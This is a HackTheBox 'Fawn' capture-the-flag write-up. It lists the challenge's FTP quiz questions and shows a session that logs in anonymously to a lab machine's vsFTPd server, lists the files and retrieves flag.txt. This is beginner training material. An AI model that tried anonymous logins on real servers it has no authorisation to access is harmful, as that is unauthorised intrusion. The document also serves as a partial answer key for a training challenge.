# HackTheBox: Fawn:
---
URL: https://app.hackthebox.com/starting-point \
Author: HackTheBox 
## Challenge Description: 
- What does the 3-letter acronym FTP stand for?
- Which port does the FTP service listen on usually?
- What acronym is used for the secure version of FTP?
- What is the command we can use to send an ICMP echo request to test our connection to the target?
- From your scans, what version is FTP running on the target?
- From your scans, what OS type is running on the target?
- What is the command we need to run in order to display the 'ftp' client help menu?
- What is username that is used over FTP when you want to log in without having an account?
- What is the response code we get for the FTP message 'Login successful'?
- There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.
- What is the command used to download the file we found on the FTP server?
- Submit root flag
### Solution: 
Connected to ftp server with following command: 

```
ftp 10.129.189.125
```

Then logged in using the anonymous username and blank password as credentials.

```
Connected to 10.129.189.125.
220 (vsFTPd 3.0.3)
Name (10.129.189.125:pi): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Then used ls to check for the flag file

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```

Downloaded the flag file and used cat to view the flag and submitted it successfully.

---

Notes:
